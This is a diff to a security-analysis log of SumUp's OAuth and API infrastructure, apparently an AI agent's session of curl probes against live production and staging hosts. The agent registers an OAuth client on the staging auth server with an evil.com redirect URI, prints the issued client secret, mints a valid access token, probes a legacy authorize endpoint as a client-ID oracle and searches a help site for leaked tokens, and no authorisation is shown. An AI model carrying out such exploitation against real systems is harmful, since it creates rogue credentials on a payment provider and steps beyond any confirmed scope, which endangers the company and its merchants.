@@ -6254,3 +6254,235 @@ testability: PASSIVE
 ## STEP 7 — RISK
 [RISK] sumup: 82 — Auth server (auth.sumup.com) exposes critical OAuth config (alg=none, PAR, device flow, "none" client auth) with full scope catalog mapping to payment APIs. Legacy OAuth gateway (api.sumup.com/authorize) confirmed LIVE with client_id oracle, redirect_uri allowlist divergence, and wildcard CORS — new attack surface for OAuth code theft. Staging auth server (auth.sam-app.ro) allows unauthenticated RFC 7591 dynamic client registration with attacker-controlled redirect_uris and audience, minting valid JWTs (empty scope but controlled aud) — staging/prod divergence. RFC 9728 resource server metadata on api.sumup.com adds token validation surface. Contentful Preview token leak on help.sumup.com exposes 1,082 draft entries. All high-impact vectors require merchant OAuth token (AUTH_HELPED) or registered client, but legacy gateway divergence enables passive callback host enumeration, staging registration is fully unauthenticated, and help center leak is immediately exploitable. API gateway fully gated. Vercel me.sumup.com/checkout.sumup.com add non-Cloudflare surface but auth-gated at edge. Portal introduces third-party supply-chain risk (iriscrm.com) if in-scope confirmed. Admin panel hardened. Financial attack surface concentrated but access-controlled with new legacy OAuth vector, staging registration bypass, resource server metadata exposure, and content leak.
 Analysis complete. All 8 steps executed with structured output blocks.
+===== ANALYST nemotron3 2026-09-08 09:15:48 UTC =====
+[0m
+> build · nemotron-3-ultra-free
+[0m
+[0m$ [0mcurl -s -I https://api.sumup.com/.well-known/oauth-protected-resource 2>&1 | head -20
+HTTP/2 200 
+date: Tue, 08 Sep 2026 08:56:52 GMT
+content-type: application/json
+content-length: 286
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+access-control-allow-origin: *
+access-control-max-age: 300
+server: cloudflare
+x-request-id: 00f14e5e-2441-988d-abd5-6a2a435e9afd
+x-envoy-upstream-service-time: 0
+x-envoy-decorator-operation: apigateway2-headless.identity.svc.cluster.local:8080/*
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=KTdkGkSivq0fIqn_a6z9jmOHCmh6_47gU4.DArskp40-1788857812.6365366-1.0.1.1-i2_2IXzzIMITfBGFWcKiW0A2vlTDKs4aiGnk5myEuCdV4UMf12pKDGRmXcQ1XpnliyySJF.iRjRIcza7yxYVF8IHTV5lxndW3Ixpb8ryU1mZv8NNPwBdgE8EtJXze7Orm10mDcb4vfr1.KTufhjYnw; HttpOnly; SameSite=None; Secure; Path=/; Domain=sumup.com; Expires=Tue, 08 Sep 2026 09:26:52 GMT
+report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=SkbesltgWYpn%2BMGvRtTDJ7hqcO%2BWl6q1SIFBUJzFxtt0ceF8FzY6bEopou3WAFk%2FLke%2FUpkkSC5oyc4l1n60IFzh%2B4gMp4B2sQzPOeYNpQH5sUuM2uXDZRX2BDd3dMg%3D"}]}
+nel: {"report_to":"cf-nel","success_fraction":0.01,"max_age":604800}
+cf-ray: a37cbe10fdc314bc-IAD
+[0m
+[0m$ [0mcurl -s -I https://help.sumup.com 2>&1 | head -30
+HTTP/2 307 
+cache-control: public, max-age=0, must-revalidate
+content-type: text/plain
+date: Tue, 08 Sep 2026 08:56:54 GMT
+location: /en-GB
+server: Vercel
+strict-transport-security: max-age=63072000
+x-vercel-id: iad1::d4g58-1788857814810-679fd2fdf091
+[0m
+[0m$ [0mcurl -s -I https://auth.sam-app.ro/.well-known/openid-configuration 2>&1 | head -20
+HTTP/2 404 
+date: Tue, 08 Sep 2026 08:56:55 GMT
+vary: Origin
+x-envoy-upstream-service-time: 3
+server: cloudflare
+x-request-id: e8beec7e-0940-97e5-b247-61faa17d829e
+x-envoy-decorator-operation: envoy-headless.identity.svc.cluster.local:8080/*
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=dmyjEDniIzkh6WbdelCiEveEitrH.9IkoqnZFcobJMQ-1788857814.8669386-1.0.1.1-W1ph2LNycfOWsgmWWkEYC3BfMkja8pEUp1CKxUEOUZSVoO194K_JCXonCTOysCQYM0sqALfO_jij1jhoaIq4QPvMSTNG7ZewOfVcIsC.kSwSjrcZZwJQaQn2NaTTTlP3; HttpOnly; SameSite=None; Secure; Path=/; Domain=sam-app.ro; Expires=Tue, 08 Sep 2026 09:26:55 GMT
+cf-ray: a37cbe1ee895ca91-IAD
+[0m
+[0m$ [0mcurl -s "https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678" -I 2>&1 | head -30
+HTTP/2 404 
+date: Tue, 08 Sep 2026 08:57:56 GMT
+content-type: application/json
+content-length: 150
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+access-control-allow-origin: *
+access-control-max-age: 300
+server: cloudflare
+x-request-id: 2b48f1f7-77a3-9753-8d65-3ec1e746f0c6
+x-envoy-upstream-service-time: 0
+x-envoy-decorator-operation: apigateway2-headless.identity.svc.cluster.local:8080/*
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=7uEI9XMIx612b5ofJTMazv.1ftVoZmnyEZmT4rp1VfM-1788857876.0417318-1.0.1.1-b9WLsC5PK2Qykt2D_6OmhtUA3hwULk2TpzsMGOzAdMKMFk4gjyIMZQp8_Rnt3h7CPvnoeI4JXqcBYqzhPTezDuEaUedH.WMAhxQmU3G8s.Cs4Z_IioQ7ArXiXBGiZI_iENwgekyAhEyIfBXpzLGWnw; HttpOnly; SameSite=None; Secure; Path=/; Domain=sumup.com; Expires=Tue, 08 Sep 2026 09:27:56 GMT
+report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=%2Bfs%2BIWOAli6LZ5PFpDOjm5%2FezJkLhFEDAb%2FIddqTDRLxb%2BeMjOnShKWiU9ttJJJDSIxPOFE7df2nfA%2BRyMBOtOAFPw9CsLQ7Hv27VVtnHV27nVehsBH5%2B0kWvSgv80s%3D"}]}
+nel: {"report_to":"cf-nel","success_fraction":0.01,"max_age":604800}
+cf-ray: a37cbf9d4b04c994-IAD
+[0m
+[0m$ [0mcurl -s "https://auth.sumup.com/oauth2/auth?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=openid&state=test12345678" -I 2>&1 | head -30
+HTTP/2 405 
+date: Tue, 08 Sep 2026 08:57:56 GMT
+content-type: text/plain; charset=utf-8
+content-length: 19
+allow: GET, OPTIONS, POST
+x-content-type-options: nosniff
+x-envoy-upstream-service-time: 2
+server: cloudflare
+x-request-id: 18bab79d-e72c-9d45-a5d0-f75109f45222
+x-envoy-decorator-operation: envoy-headless.identity.svc.cluster.local:8080/*
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=wfDMMbNn5I6NeNo1Eoymsd5wanjEi07Rg3lMtXRlo2g-1788857876.5555284-1.0.1.1-unZ4MRGHFBORg8J9i.mrM9HRmXdcWj1eww_idX.WIpo8MQDuEyPtchQomW4dEMf0OgBt74GRDga52G1LIkBWNwDxxbf0G65fMBQycV.HaAFwKXsJFWiaLmFPgV0DCfvpUN9ItBDvZVV.STcpunMamQ; HttpOnly; SameSite=None; Secure; Path=/; Domain=sumup.com; Expires=Tue, 08 Sep 2026 09:27:56 GMT
+report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=X2dz1s5pMHQS8HmZdGJ9W%2FxXDczEQe%2B3uyS6y0x1FqgtXa1AXh1gAcWkoS9BQp3ScwJeZWtIwjQfnYCCehfkRN%2BeZXjVxzmPQbJhL64xLFqUB4o533jaSc6FUP14x7fk"}]}
+nel: {"report_to":"cf-nel","success_fraction":0.01,"max_age":604800}
+cf-ray: a37cbfa0782dd6cb-IAD
+[0m
+[0m$ [0mcurl -s https://help.sumup.com/en-GB -I 2>&1 | head -20
+HTTP/2 200 
+age: 13
+cache-control: public, max-age=0, must-revalidate
+content-type: text/html; charset=utf-8
+date: Mon, 07 Sep 2026 13:37:31 GMT
+etag: "4on30g5cot3l34"
+server: Vercel
+set-cookie: originCountry=US; Path=/
+strict-transport-security: max-age=63072000
+x-matched-path: /en-GB
+x-powered-by: Next.js
+x-vercel-cache: HIT
+x-vercel-id: iad1::fra1::qtn4x-1788857876810-a04534a62b35
+content-length: 167350
+[0m
+[0m$ [0mcurl -s https://help.sumup.com/en-GB 2>&1 | grep -i "contentful\|preview" | head -20
+...output truncated...
+
+Full output saved to: /home/runner/.local/share/opencode/tool-output/tool_080424fe2001GGVnk3l0GQ7fcM
+
+(no output)
+[0m
+[0m$ [0mcurl -s -X POST https://auth.sam-app.ro/oauth2/register -H "Content-Type: application/json" -d '{"client_name":"test","redirect_uris":["https://evil.com/callback"],"grant_types":["authorization_code","client_credentials"],"response_types":["code"],"token_endpoint_auth_method":"client_secret_post"}' 2>&1 | head -50
+{
+  "client_id": "cl_1YDRP5EJMN8E1VSCAR1CMM0FN7",
+  "client_name": "test",
+  "client_secret": "ipbxuPKUwCBkpwZXYAObiSbRitPogEXy",
+  "redirect_uris": [
+    "https://evil.com/callback"
+  ],
+  "grant_types": [
+    "authorization_code",
+    "client_credentials"
+  ],
+  "response_types": [
+    "code"
+  ],
+  "scope": "",
+  "token_endpoint_auth_method": "client_secret_post",
+  "subject_type": "",
+  "audience": "",
+  "preferred_algorithm": null,
+  "client_id_issued_at": 1788858228,
+  "client_secret_expires_at": 0
+}
+[0m
+[0m$ [0mcurl -s https://api.sam-app.ro/.well-known/oauth-protected-resource 2>&1 | head -30
+{
+	"resource_name": "SumUp API (stage)",
+	"resource": "https://api.sam-app.ro",
+	"authorization_servers": ["https://auth.sam-app.ro"],
+	"bearer_methods_supported": ["header"],
+	"jwks_uri": "https://auth.sam-app.ro/.well-known/jwks.json",
+	"resource_documentation": "https://developer-stage.sumup-vercel.app"
+}
+[0m
+[0m$ [0mcurl -s -X POST https://auth.sam-app.ro/oauth2/token -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=client_credentials&client_id=cl_1YDRP5EJMN8E1VSCAR1CMM0FN7&client_secret=ipbxuPKUwCBkpwZXYAObiSbRitPogEXy" 2>&1 | head -50
+{
+  "access_token": "eyJhbGciOiJFZERTQSIsImtpZCI6InVnSzdHRGZPZjM1SEU1bjJQd3N5OUszSFNuWVdOUEdiUm5XUnNjYzgzTGciLCJ0eXAiOiJhdCtqd3QifQ.eyJpc3MiOiJodHRwczovL2F1dGguc2FtLWFwcC5ybyIsInN1YiI6ImNsXzFZRFJQNUVKTU44RTFWU0NBUjFDTU0wRk43IiwiYXVkIjpbImh0dHBzOi8vYXBpLnNhbS1hcHAucm8iXSwiZXhwIjoxNzg4ODYyMDQyLCJuYmYiOjE3ODg4NTg0NDIsImlhdCI6MTc4ODg1ODQ0MiwiY2xpZW50X2lkIjoiY2xfMVlEUlA1RUpNTjhFMVZTQ0FSMUNNTTBGTjciLCJzY3AiOltdLCJhY3IiOiJhYWwxIiwiYXV0aF90aW1lIjoxNzg4ODU4NDQyLCJqdGkiOiJjMzNjNzBmYi03NzlhLTQ3YWQtYTVkNy00M2Q5MzNmZDYyNjEifQ.OsEGd8JZOGCfIQiFguVY12sXQe8AJ0LY-9Lk_-m-KrE7zUfEco6u0Z8PYhhvM06YGxgYzQG4DG_523l1M0BLDw",
+  "token_type": "Bearer",
+  "expires_in": 3599
+}
+[0m
+[0m$ [0mcurl -s https://api.sumup.com/authorize -I 2>&1 | head -20
+HTTP/2 404 
+date: Tue, 08 Sep 2026 09:07:22 GMT
+content-type: application/json
+content-length: 150
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+access-control-allow-origin: *
+access-control-max-age: 300
+server: cloudflare
+x-request-id: d7f59b77-d339-939e-8a4e-5ee2fd361c0e
+x-envoy-upstream-service-time: 0
+x-envoy-decorator-operation: apigateway2-headless.identity.svc.cluster.local:8080/*
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=2FgaKOWeZ6eolujO6Kg1QYaEPiK3VLsOo1uB8WwqmIA-1788858442.8496978-1.0.1.1-gOxawXGyW8UyT9eNg430UWtYCXA7Cs52o8M47ueH4bkE5Ua1TiCJ32fEq7NjVIEGtu1WsdSQKixjH0z7221LJ9Bfq2ZKab61nDVzeqhYGeXGoybhl2ovswtC1TcgtnwE.QnLyJYa0v_mOAH1memOnA; HttpOnly; SameSite=None; Secure; Path=/; Domain=sumup.com; Expires=Tue, 08 Sep 2026 09:37:22 GMT
+report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=qNUqNcJPtU%2F%2FEMcSUlWjxqUIyC6Z3IOYB8oBvmPGG58KCSDQfhew28sS6mD1TAr3Yb%2BVAp3zu4z%2BDPUz9sTa3pokV7XA%2BquPJCc5LUO%2FfrtipsFe%2Fwy2om10JDj%2Bl8g%3D"}]}
+nel: {"report_to":"cf-nel","success_fraction":0.01,"max_age":604800}
+cf-ray: a37ccd73cfc514bc-IAD
+[0m
+[0m$ [0mcurl -s "https://api.sumup.com/authorize?client_id=unknown123&redirect_uri=https://test.com/callback&response_type=code&scope=classic&state=test12345678" -I 2>&1 | head -20
+HTTP/2 404 
+date: Tue, 08 Sep 2026 09:07:23 GMT
+content-type: application/json
+content-length: 150
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+access-control-allow-origin: *
+access-control-max-age: 300
+server: cloudflare
+x-request-id: fcb3a4eb-838f-9b2d-abd9-f1e9d21308c5
+x-envoy-upstream-service-time: 0
+x-envoy-decorator-operation: apigateway2-headless.identity.svc.cluster.local:8080/*
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=kxncL0IahQjlt8Za48DBl2VtDSmZLvbSrynYHXXtKEQ-1788858443.572895-1.0.1.1-uJt4BznK9ANKX3n_GDwBjDCoefpmZdN5FITMHqFQEl9ornfhQQmcqAVSI5B_j87S_P2zyEZ7lBgYiaSLgbkiTMDV9qpEh.fbrHm7DFrV69mNdp9.vWjveCDt1EBM7bCtlwpQ8kJT.Hw1a.gMjoOEXA; HttpOnly; SameSite=None; Secure; Path=/; Domain=sumup.com; Expires=Tue, 08 Sep 2026 09:37:23 GMT
+report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=nSCXBgF%2FbJRyjzX6BAv8wF9OlnFa65qjrBC0Q0Ao5KyiLZM4R8rDD6Z3BHuUL79rFwIhRfkR493xInUwYiihXOOL9lVqijREq9E%2FVyGE9SePSaYKIxUHJVQ0dTtcJho%3D"}]}
+nel: {"report_to":"cf-nel","success_fraction":0.01,"max_age":604800}
+cf-ray: a37ccd785d612d1d-IAD
+[0m
+[0m$ [0mcurl -s https://help.sumup.com/en-GB 2>&1 | grep -oE 'preview\.contentful\.com[^"\s]+' | head -5
+(no output)
+[0m
+[0m$ [0mcurl -s "https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678" 2>&1 | head -10
+(no output)
+[0m
+[0m$ [0mcurl -s -v "https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678" 2>&1 | head -30
+* Host api.sumup.com:443 was resolved.
+* IPv6: (none)
+* IPv4: 104.18.34.207, 172.64.153.49
+*   Trying 104.18.34.207:443...
+* Connected to api.sumup.com (104.18.34.207) port 443
+* ALPN: curl offers h2,http/1.1
+} [5 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+} [512 bytes data]
+*  CAfile: /etc/ssl/certs/ca-certificates.crt
+*  CApath: /etc/ssl/certs
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+{ [122 bytes data]
+* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+{ [19 bytes data]
+* TLSv1.3 (IN), TLS handshake, Certificate (11):
+{ [3412 bytes data]
+* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+{ [78 bytes data]
+* TLSv1.3 (IN), TLS handshake, Finished (20):
+{ [52 bytes data]
+* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+} [1 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Finished (20):
+} [52 bytes data]
+* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519 / id-ecPublicKey
+* ALPN: server accepted h2
+* Server certificate:
+*  subject: CN=api.sumup.com
+[0m
+[0m$ [0mcurl -s https://help.sumup.com/en-GB 2>&1 | grep -oE 'access[_-]?token["\s:=]+[^"\s,}]+' | head -10
+(no output)
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678" 2>&1
+302 https://auth.sumup.com/flows/oauth2/error?error=invalid_request&error_description=The+%27redirect_uri%27+parameter+does+not+match+any+of+the+OAuth+2.0+Client%27s+pre-registered+redirect+urls.
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" "https://api.sumup.com/authorize?client_id=unknown123&redirect_uri=https://test.com/callback&response_type=code&scope=classic&state=test12345678" 2>&1
+302 https://auth.sumup.com/flows/oauth2/error?error=invalid_client&error_description=The+requested+OAuth+2.0+Client+does+not+exist.
+[0m
+[0m$ [0mcurl -s https://help.sumup.com/en-GB 2>&1 | grep -oE 'Bearer[^"\s,}]+' | head -5
+(no output)
+[0m
+[0m$ [0mcurl -s https://help.sumup.com/en-GB 2>&1 | grep -oE 'contentful[^"\s,}]*' | head -10
+(no output)
+[0m
